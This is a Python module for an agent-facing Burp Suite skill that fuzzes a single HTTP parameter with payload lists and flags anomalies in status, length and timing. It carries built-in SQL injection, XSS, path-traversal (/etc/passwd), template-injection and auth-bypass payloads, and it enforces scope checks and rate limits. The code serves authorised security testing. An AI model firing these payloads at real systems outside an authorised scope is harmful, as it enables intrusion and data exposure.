"""
Intruder tool: burp-intruder-run.

Performs targeted fuzzing of a single parameter across a list of
payloads. Acts as a programmatic Intruder (Sniper mode) — takes a
base request, substitutes one parameter value with each payload,
sends the requests sequentially with rate limiting, and returns a
summary table of results for differential analysis.

This bridges the gap between single-shot repeater-send and the
heavy active scanner, giving the agent fine-grained control over
payload-driven testing.
"""

import json
import logging
import sys
import time
from pathlib import Path

from burp_suite_skill.clients.belch_client import BelchClient, BelchClientError
from burp_suite_skill.clients.pyburp_client import PyBurpClient, PyBurpClientError
from burp_suite_skill.config import RESPONSE_TRUNCATE_LENGTH
from burp_suite_skill.utils.safety import (
    CircuitBreakerOpen,
    RateLimitExceeded,
    ScopeViolation,
    circuit_breaker,
    enforce_scope,
    rate_limiter,
    sanitize_output,
)

logger = logging.getLogger(__name__)

# Built-in payload sets for common vulnerability classes
BUILTIN_PAYLOADS: dict[str, list[str]] = {
    "sqli-basic": [
        "'",
        "''",
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
        "1 UNION SELECT NULL--",
        "1 UNION SELECT NULL,NULL--",
        "' AND SLEEP(5)--",
        "1; WAITFOR DELAY '0:0:5'--",
        "1' AND '1'='1",
        "1' AND '1'='2",
    ],
    "xss-basic": [
        "<script>alert(1)</script>",
        '"><script>alert(1)</script>',
        "'-alert(1)-'",
        "<img src=x onerror=alert(1)>",
        '"><img src=x onerror=alert(1)>',
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<details open ontoggle=alert(1)>",
        "{{7*7}}",
        "${7*7}",
    ],
    "path-traversal": [
        "../etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "..\\windows\\win.ini",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/etc/passwd",
        "file:///etc/passwd",
    ],
    "ssti-basic": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{config}}",
        "{{self.__class__.__mro__}}",
        "${T(java.lang.Runtime).getRuntime()}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
    ],
    "auth-bypass": [
        "admin",
        "administrator",
        "root",
        "true",
        "1",
        "yes",
        '{"admin":true}',
        "admin'--",
    ],
    "idor-numeric": [str(i) for i in range(1, 21)],
}

# Maximum payloads per run to prevent excessive traffic
MAX_PAYLOADS_PER_RUN = 100

# Delay between requests in seconds
DEFAULT_DELAY = 1.0


def _load_payloads(args) -> list[str]:
    """
    Load payloads from one of three sources:
    1. Built-in payload set (--payload-set)
    2. File with one payload per line (--payload-file)
    3. Inline comma-separated list (--payloads)
    """
    payloads: list[str] = []

    if args.payload_set:
        name = args.payload_set
        if name not in BUILTIN_PAYLOADS:
            available = ", ".join(sorted(BUILTIN_PAYLOADS.keys()))
            raise ValueError(
                f"Unknown payload set '{name}'. Available: {available}"
            )
        payloads = list(BUILTIN_PAYLOADS[name])

    elif args.payload_file:
        path = Path(args.payload_file)
        if not path.exists():
            raise FileNotFoundError(f"Payload file not found: {path}")
        payloads = [
            line.strip()
            for line in path.read_text().splitlines()
            if line.strip() and not line.startswith("#")
        ]

    elif args.payloads:
        payloads = [p.strip() for p in args.payloads.split(",") if p.strip()]

    if not payloads:
        raise ValueError(
            "No payloads specified. Use --payload-set, --payload-file, or --payloads"
        )

    if len(payloads) > MAX_PAYLOADS_PER_RUN:
        logger.warning(
            "Payload list truncated from %d to %d (safety limit)",
            len(payloads),
            MAX_PAYLOADS_PER_RUN,
        )
        payloads = payloads[:MAX_PAYLOADS_PER_RUN]

    return payloads


def _apply_payload_to_request(
    base_request: dict, param_name: str, payload: str
) -> dict:
    """Substitute a single parameter value in the request with the payload."""
    import re

    modified = dict(base_request)
    url = modified.get("url", "")
    body = modified.get("body", "")
    headers = modified.get("headers", {})
    content_type = ""
    if isinstance(headers, dict):
        content_type = headers.get("Content-Type", headers.get("content-type", ""))

    applied = False

    # Try URL query string
    pattern = rf"({re.escape(param_name)}=)[^&]*"
    if re.search(pattern, url):
        modified["url"] = re.sub(pattern, rf"\g<1>{payload}", url)
        applied = True

    # Try JSON body
    if not applied and body and "json" in content_type.lower():
        try:
            body_json = json.loads(body)
            if param_name in body_json:
                body_json[param_name] = payload
                modified["body"] = json.dumps(body_json)
                applied = True
        except (json.JSONDecodeError, TypeError):
            pass

    # Try form-encoded body
    if not applied and body:
        pattern = rf"({re.escape(param_name)}=)[^&]*"
        if re.search(pattern, body):
            modified["body"] = re.sub(pattern, rf"\g<1>{payload}", body)
            applied = True

    # If parameter wasn't found anywhere, append to URL as query param
    if not applied:
        separator = "&" if "?" in url else "?"
        modified["url"] = f"{url}{separator}{param_name}={payload}"

    return modified


def intruder_run(args) -> int:
    """Run an Intruder-style attack with a list of payloads against a parameter."""
    belch = BelchClient()
    pyburp = PyBurpClient()
    delay = args.delay if args.delay is not None else DEFAULT_DELAY

    try:
        # Step 1: Load payloads
        try:
            payloads = _load_payloads(args)
        except (ValueError, FileNotFoundError) as exc:
            print(json.dumps({"error": str(exc)}), file=sys.stderr)
            return 1

        # Step 2: Get base request
        if args.base_req_id:
            try:
                base_request = belch.get_history_item(args.base_req_id)
                if not base_request:
                    print(json.dumps({
                        "error": f"History item {args.base_req_id} not found"
                    }), file=sys.stderr)
                    return 1
            except BelchClientError as exc:
                print(json.dumps({"error": str(exc)}), file=sys.stderr)
                return 1
        elif args.url:
            base_request = {
                "method": args.method or "GET",
                "url": args.url,
                "headers": {},
                "body": args.body or "",
            }
        else:
            print(json.dumps({
                "error": "Must specify --base-req-id or --url"
            }), file=sys.stderr)
            return 1

        # Step 3: Scope check
        target_url = base_request.get("url", "")
        try:
            scope_config = belch.get_scope()
            enforce_scope(target_url, scope_config)
        except ScopeViolation as exc:
            print(json.dumps({
                "error": f"SCOPE VIOLATION: {exc}",
                "blocked": True,
            }), file=sys.stderr)
            return 1
        except BelchClientError:
            print(json.dumps({
                "error": "Cannot verify scope. Refusing to run intruder.",
                "blocked": True,
            }), file=sys.stderr)
            return 1

        param_name = args.param_name

        # Step 4: Send baseline request (unmodified) for comparison
        logger.info(
            "Starting intruder run: param=%s, payloads=%d, delay=%.1fs",
            param_name, len(payloads), delay,
        )

        results = []
        errors = 0

        # Step 5: Iterate through payloads
        for i, payload in enumerate(payloads):
            # Circuit breaker check
            try:
                circuit_breaker.check()
            except CircuitBreakerOpen as exc:
                print(json.dumps({
                    "error": f"CIRCUIT BREAKER: {exc}",
                    "completed": i,
                    "total": len(payloads),
                    "results": results,
                }), file=sys.stderr)
                return 1

            # Rate limit
            try:
                rate_limiter.acquire()
            except RateLimitExceeded as exc:
                print(json.dumps({
                    "error": f"RATE LIMIT: {exc}",
                    "completed": i,
                    "total": len(payloads),
                    "results": results,
                }), file=sys.stderr)
                return 1

            # Apply payload
            modified = _apply_payload_to_request(base_request, param_name, payload)

            # Send request
            start_time = time.time()
            try:
                response = pyburp.send_request(
                    method=modified.get("method", "GET"),
                    url=modified.get("url", target_url),
                    headers=modified.get("headers"),
                    body=modified.get("body"),
                )
                elapsed_ms = int((time.time() - start_time) * 1000)
                circuit_breaker.record_success()

                status_code = response.get("status_code", 0)
                body = response.get("body", "")
                body_len = len(body) if body else 0

                # Record 5xx as errors for circuit breaker
                if status_code >= 500:
                    circuit_breaker.record_error()
                    errors += 1

                result_entry = {
                    "index": i,
                    "payload": payload,
                    "status_code": status_code,
                    "body_length": body_len,
                    "elapsed_ms": elapsed_ms,
                }

                # Include a short body preview for interesting responses
                if args.show_responses and body:
                    ct = ""
                    resp_headers = response.get("headers", {})
                    if isinstance(resp_headers, dict):
                        ct = resp_headers.get("Content-Type", "")
                    result_entry["body_preview"] = sanitize_output(
                        body, ct, max_length=200
                    )

                results.append(result_entry)

            except PyBurpClientError as exc:
                elapsed_ms = int((time.time() - start_time) * 1000)
                circuit_breaker.record_error()
                errors += 1
                results.append({
                    "index": i,
                    "payload": payload,
                    "error": str(exc),
                    "elapsed_ms": elapsed_ms,
                })

            # Delay between requests
            if delay > 0 and i < len(payloads) - 1:
                time.sleep(delay)

        # Step 6: Analyze results
        analysis = _analyze_results(results)

        output = {
            "status": "completed",
            "parameter": param_name,
            "total_payloads": len(payloads),
            "total_sent": len(results),
            "total_errors": errors,
            "results": results,
            "analysis": analysis,
        }
        print(json.dumps(output, indent=2))
        return 0

    except Exception as exc:
        print(json.dumps({"error": f"Unexpected error: {exc}"}), file=sys.stderr)
        return 1
    finally:
        pyburp.close()


def _analyze_results(results: list[dict]) -> dict:
    """
    Analyze intruder results to identify anomalies that may indicate
    vulnerabilities. Looks for status code deviations, body length
    outliers, and timing anomalies.
    """
    if not results:
        return {"conclusion": "No results to analyze"}

    successful = [r for r in results if "error" not in r]
    if not successful:
        return {"conclusion": "All requests failed"}

    # Status code distribution
    status_counts: dict[int, int] = {}
    for r in successful:
        sc = r["status_code"]
        status_counts[sc] = status_counts.get(sc, 0) + 1

    # Body length statistics
    lengths = [r["body_length"] for r in successful]
    avg_len = sum(lengths) / len(lengths) if lengths else 0
    min_len = min(lengths) if lengths else 0
    max_len = max(lengths) if lengths else 0

    # Timing statistics
    timings = [r["elapsed_ms"] for r in successful]
    avg_time = sum(timings) / len(timings) if timings else 0
    max_time = max(timings) if timings else 0

    # Find anomalies
    anomalies = []

    # Status code anomalies: payloads that got a different status
    if len(status_counts) > 1:
        most_common_status = max(status_counts, key=status_counts.get)
        for r in successful:
            if r["status_code"] != most_common_status:
                anomalies.append({
                    "type": "status_code_deviation",
                    "payload": r["payload"],
                    "expected": most_common_status,
                    "actual": r["status_code"],
                    "index": r["index"],
                })

    # Body length anomalies: payloads where length deviates significantly
    if avg_len > 0:
        threshold = max(avg_len * 0.3, 50)  # 30% deviation or 50 chars
        for r in successful:
            deviation = abs(r["body_length"] - avg_len)
            if deviation > threshold:
                anomalies.append({
                    "type": "body_length_deviation",
                    "payload": r["payload"],
                    "body_length": r["body_length"],
                    "avg_length": round(avg_len),
                    "deviation": round(deviation),
                    "index": r["index"],
                })

    # Timing anomalies: payloads with significantly longer response times
    if avg_time > 0:
        time_threshold = max(avg_time * 3, 3000)  # 3x average or 3 seconds
        for r in successful:
            if r["elapsed_ms"] > time_threshold:
                anomalies.append({
                    "type": "timing_anomaly",
                    "payload": r["payload"],
                    "elapsed_ms": r["elapsed_ms"],
                    "avg_ms": round(avg_time),
                    "note": "Significant delay - possible time-based injection",
                    "index": r["index"],
                })

    analysis = {
        "status_distribution": status_counts,
        "body_length_stats": {
            "min": min_len,
            "max": max_len,
            "avg": round(avg_len),
        },
        "timing_stats": {
            "avg_ms": round(avg_time),
            "max_ms": max_time,
        },
        "anomalies_found": len(anomalies),
        "anomalies": anomalies,
    }

    if anomalies:
        analysis["conclusion"] = (
            f"Found {len(anomalies)} anomalies across {len(results)} payloads. "
            "Review the anomalies for potential vulnerabilities."
        )
    else:
        analysis["conclusion"] = (
            "No significant anomalies detected. All responses were consistent, "
            "suggesting the parameter may be properly handled."
        )

    return analysis


def intruder_payloads(args) -> int:
    """List available built-in payload sets."""
    output = {
        "available_payload_sets": {
            name: {
                "count": len(payloads),
                "sample": payloads[:3],
            }
            for name, payloads in sorted(BUILTIN_PAYLOADS.items())
        }
    }
    print(json.dumps(output, indent=2))
    return 0


def register_intruder_commands(subparsers) -> None:
    """Register intruder-related subcommands."""
    # burp-intruder-run
    run_parser = subparsers.add_parser(
        "intruder",
        help="Run Intruder-style fuzzing on a parameter with a payload list",
    )

    # Request source
    source_group = run_parser.add_mutually_exclusive_group()
    source_group.add_argument(
        "--base-req-id",
        type=int,
        dest="base_req_id",
        help="History item ID to use as base request",
    )
    source_group.add_argument(
        "--url",
        help="Target URL for a fresh request",
    )

    # Target parameter
    run_parser.add_argument(
        "--param-name",
        dest="param_name",
        required=True,
        help="Name of the parameter to fuzz",
    )

    # Payload source (one required)
    payload_group = run_parser.add_mutually_exclusive_group(required=True)
    payload_group.add_argument(
        "--payload-set",
        dest="payload_set",
        choices=sorted(BUILTIN_PAYLOADS.keys()),
        help="Use a built-in payload set",
    )
    payload_group.add_argument(
        "--payload-file",
        dest="payload_file",
        help="File with one payload per line",
    )
    payload_group.add_argument(
        "--payloads",
        help="Comma-separated list of payloads",
    )

    # Options
    run_parser.add_argument(
        "--method",
        help="Override HTTP method",
    )
    run_parser.add_argument(
        "--body",
        help="Override request body",
    )
    run_parser.add_argument(
        "--delay",
        type=float,
        default=DEFAULT_DELAY,
        help=f"Delay between requests in seconds (default: {DEFAULT_DELAY})",
    )
    run_parser.add_argument(
        "--show-responses",
        action="store_true",
        dest="show_responses",
        help="Include short body previews in results",
    )
    run_parser.set_defaults(func=intruder_run)

    # burp-intruder-payloads
    payloads_parser = subparsers.add_parser(
        "intruder-payloads",
        help="List available built-in payload sets",
    )
    payloads_parser.set_defaults(func=intruder_payloads)
